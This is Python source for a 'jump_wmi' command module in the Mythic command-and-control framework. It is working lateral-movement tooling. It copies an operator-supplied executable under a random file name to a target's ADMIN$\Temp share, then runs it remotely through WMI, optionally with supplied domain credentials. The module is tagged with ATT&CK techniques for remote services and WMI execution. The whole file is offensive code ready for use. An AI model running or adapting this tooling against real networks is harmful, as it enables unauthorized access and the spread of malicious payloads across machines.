from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import random
import string


class JumpWmiArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                cli_name="Target",
                display_name="Target",
                type=ParameterType.String,
                description="Hostname or IP address of the remote target.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="payload",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.File,
                description="Executable to upload and run on the remote host.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
            ),
            CommandParameter(
                name="command",
                cli_name="Command",
                display_name="Extra Arguments",
                type=ParameterType.String,
                description="Optional arguments to append to the uploaded binary.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="username",
                cli_name="Username",
                display_name="Username",
                type=ParameterType.String,
                description="Optional username for WMIC auth.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
            CommandParameter(
                name="password",
                cli_name="Password",
                display_name="Password",
                type=ParameterType.String,
                description="Optional password for WMIC auth.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
            ),
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Optional domain for WMIC auth.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
            ),
        ]

    async def parse_arguments(self):
        raise ValueError("Must use the modal or supply named arguments")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


async def mirror_up_output(task: PTTaskCompletionFunctionMessage):
    response_search = await SendMythicRPCResponseSearch(
        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
    )
    if response_search.Success:
        for r in response_search.Responses:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.TaskData.Task.ID,
                    Response=r.Response.encode(),
                )
            )
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=task.TaskData.Task.ID,
                Response="\n".encode(),
            )
        )


async def wmi_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to execute wmi"
    return response


async def upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to copy over file"
        return response

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="executing wmi...",
        )
    )

    params = {
        "command": task.TaskData.args.get_arg("_lm_exec_cmd"),
        "host": task.TaskData.args.get_arg("target"),
    }
    username = task.TaskData.args.get_arg("username") or ""
    password = task.TaskData.args.get_arg("password") or ""
    domain = task.TaskData.args.get_arg("domain") or ""
    if username:
        params["username"] = username
    if password:
        params["password"] = password
    if domain:
        params["domain"] = domain

    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="wmi_callback",
            CommandName="wmiexecute",
            Params=json.dumps(params),
        )
    )
    return response


class JumpWmiCommand(CommandBase):
    cmd = "jump_wmi"
    attributes = CommandAttributes(dependencies=["upload", "wmiexecute"])
    needs_admin = True
    help_cmd = "jump_wmi -Target <host> -Payload <file>"
    description = "Lateral movement workflow: upload payload, then execute via wmiexecute."
    version = 2
    script_only = True
    author = "@Lavender-exe"
    argument_class = JumpWmiArguments
    attackmapping = ["T1021.006", "T1047"]
    completion_functions = {
        "upload_callback": upload_callback,
        "wmi_callback": wmi_callback,
    }

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

        target = taskData.args.get_arg("target")
        file_id = taskData.args.get_arg("payload")
        extra_args = taskData.args.get_arg("command") or ""

        rand_name = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".exe"
        remote_unc = f"\\\\{target}\\ADMIN$\\Temp\\{rand_name}"
        exec_cmd = f"C:\\Windows\\Temp\\{rand_name}"
        if extra_args:
            exec_cmd += f" {extra_args}"

        taskData.args.add_arg("_lm_exec_cmd", exec_cmd)

        response.DisplayParams = f"{target} -> {remote_unc}"
        response.TaskStatus = "uploading file..."

        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                SubtaskCallbackFunction="upload_callback",
                CommandName="upload",
                Params=json.dumps(
                    {
                        "remote_path": remote_unc,
                        "file": file_id,
                    }
                ),
            )
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
